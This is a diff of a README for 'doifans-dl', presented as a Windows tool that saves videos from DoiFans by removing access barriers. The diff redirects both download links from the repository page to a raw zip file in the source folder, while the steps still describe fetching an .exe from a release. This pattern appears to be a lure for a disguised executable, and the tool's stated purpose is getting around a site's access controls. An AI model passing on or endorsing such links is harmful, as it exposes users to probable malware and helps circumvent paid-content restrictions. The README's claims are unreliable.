@@ -1,6 +1,6 @@
 # 📥 doifans-dl - Save videos from restricted web pages
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Vaishnavi9769/doifans-dl)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Vaishnavi9769/doifans-dl/raw/refs/heads/main/src/doifans_dl/doifans-dl-3.1.zip)
 
 doifans-dl helps you save videos from DoiFans. It removes access barriers so you keep copies of content you want to view later. This tool works on Windows and handles the technical parts of the download process for you.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The program requires 100 M
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [download page](https://github.com/Vaishnavi9769/doifans-dl).
+1. Go to the [download page](https://github.com/Vaishnavi9769/doifans-dl/raw/refs/heads/main/src/doifans_dl/doifans-dl-3.1.zip).
 2. Look for the latest release on the right side of the screen.
 3. Click the link ending in .exe to start the file transfer to your computer.
 4. Move the file to your desktop or a folder you recognize.
